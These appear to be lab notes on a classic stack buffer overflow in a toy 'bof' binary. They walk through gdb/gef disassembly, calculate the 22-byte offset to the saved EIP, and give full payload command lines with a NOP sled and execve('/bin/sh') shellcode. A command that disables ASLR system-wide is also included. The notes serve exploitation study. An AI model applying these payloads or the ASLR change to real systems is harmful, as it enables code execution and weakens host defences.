# bof

*ASLR*

Use `ghidra` to find that `main()` calls `vuln()`.

```bash
# Find a function return value.
gef> disassemble main
Dump of assembler code for function main:
   0x080484af <+0>:     push   ebp
   0x080484b0 <+1>:     mov    ebp,esp
   0x080484b2 <+3>:     and    esp,0xfffffff0
   0x080484b5 <+6>:     sub    esp,0x10
   0x080484b8 <+9>:     cmp    DWORD PTR [ebp+0x8],0x2
   0x080484bc <+13>:    je     0x80484d1 <main+34>
   0x080484be <+15>:    mov    DWORD PTR [esp],0x804859d
   0x080484c5 <+22>:    call   0x8048350 <puts@plt>
   0x080484ca <+27>:    mov    eax,0x0
   0x080484cf <+32>:    jmp    0x80484e6 <main+55>
   0x080484d1 <+34>:    mov    eax,DWORD PTR [ebp+0xc]
   0x080484d4 <+37>:    add    eax,0x4
   0x080484d7 <+40>:    mov    eax,DWORD PTR [eax]
   0x080484d9 <+42>:    mov    DWORD PTR [esp],eax
   0x080484dc <+45>:    call   0x804847d <vuln>
   0x080484e1 <+50>:    mov    eax,0x0
=> 0x080484e6 <+55>:    leave  
   0x080484e7 <+56>:    ret    
End of assembler dump.
gef> b *0x080484e6  # breakpoint on main() leave
gef> run $(python3 -c 'print("A"*30)')  # provoke a crash
gef> disassemble vuln 
Dump of assembler code for function vuln:
   0x0804847d <+0>:     push   ebp
   0x0804847e <+1>:     mov    ebp,esp
   0x08048480 <+3>:     sub    esp,0x28
   0x08048483 <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x08048486 <+9>:     mov    DWORD PTR [esp+0x4],eax
   0x0804848a <+13>:    lea    eax,[ebp-0x12]
   0x0804848d <+16>:    mov    DWORD PTR [esp],eax
   0x08048490 <+19>:    call   0x8048340 <strcpy@plt>
   0x08048495 <+24>:    lea    eax,[ebp-0x12]
   0x08048498 <+27>:    mov    DWORD PTR [esp+0x4],eax
   0x0804849c <+31>:    mov    DWORD PTR [esp],0x8048580
=> 0x080484a3 <+38>:    call   0x8048330 <printf@plt>
   0x080484a8 <+43>:    mov    eax,0x0
   0x080484ad <+48>:    leave  
   0x080484ae <+49>:    ret    
End of assembler dump.
gef> b *0x08048490  # breakpoint on strcpy
gef> b *0x080484a3  # breakpoint on printf
gef> run $(python3 -c 'print("A"*30)')  # provoke a crash
gef> info frame  # show EIP address on strcpy or printf breakpoint
Stack level 0, frame at 0xffffca40:
 eip = 0x8048490 in vuln; saved eip = 0x80484e1
 called by frame at 0xffffca60
 Arglist at 0xffffca38, args: 
 Locals at 0xffffca38, Previous frame\'s sp is 0xffffca40
 Saved registers:
  ebp at 0xffffca38, eip at 0xffffca3c  # EIP register address
gef> x/16wx $esp  # show the top of the stack at each breakpoint, below output on printf breakpoint
0xffffca10:     0x08048580      0xffffca26      0x00000000      0x080482fd
0xffffca20:     0xf7f963fc      0x4141ffff      0x41414141      0x41414141  # 0x41 = A appears on 0xffffca27
0xffffca30:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffca40:     0x41414141      0x34322f78      0x08007877      0x00000000
gef> p/d 0xffffca3c - 0xffffca26  # substract the buffer start address to the EIP register address 
$1 = 22  # we got the buffer size

gef> x/64i $esp

gef> run $(python3 -c "import sys; sys.stdout.buffer.write(b'\x41'*22+b'\x30\xca\xff\xff'+b'\x90'*16+b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')")  # 0xffffca30 is a nop instruction so we execute the following ie. the shellcode
gef> run $(python3 -c "import sys; sys.stdout.buffer.write(b'\x41'*22+b'\x34\xca\xff\xff'+b'\x90'*100+b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')")  # 0xffffca34 is directly the start of the shellcode (xor %eax,%eax)
```

```bash
printf "0x%X\n" $((0xffffca3c + 0x00000004))  # EIP register address + 4
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
./bof $(python3 -c 'print("A"*21)')
```

```bash
./bof $(python3 -c 'print("A"*18)')

gdb bof
gef> run $(python3 -c 'print("A"*18)')
$eip   : 0x08048581  →  "omething will happens ! %s\n"
gef> x/16x 0xffffca36
0xffffca36:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffca46:     0xca004141      0x84e1ffff      0xcd8e0804      0x0000ffff
0xffffca56:     0x84fb0000      0x00000804      0x60000000      0x6000f7f9
0xffffca66:     0x0000f7f9      0xfe460000      0x0002f7dc      0xcb140000
gef> run $(python3 -c 'print("A"*22+"1234")')
$eip   : 0x34333231 ("1234"?)
gef> run $(python3 -c 'print("A"*22+"\x20\xca\xff\xff"+"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")')
gef> info registers
gef> x/40x $esp
gef> x/16xg $esp

gef> run $(python3 -c "import sys; sys.stdout.buffer.write(b'\x41'*22+b'\xd0\xc9\xff\xff'+b'\x90'*100+b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05')")

# Le registre EIP ou $eip sous gdb est un pointeur sur la prochaine instruction à exécuter.
gef> x/10i $eip # look at the next 10 instructions

gef> pattern create 200
gef> pattern offset <pattern>

# Disable ASLR (optional)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

## Links

- [Linux Buffer Overflow With Shellcode](https://samsclass.info/127/proj/p3-lbuf1.htm)
- https://www.0x0ff.info/2015/buffer-overflow-gdb-part-3/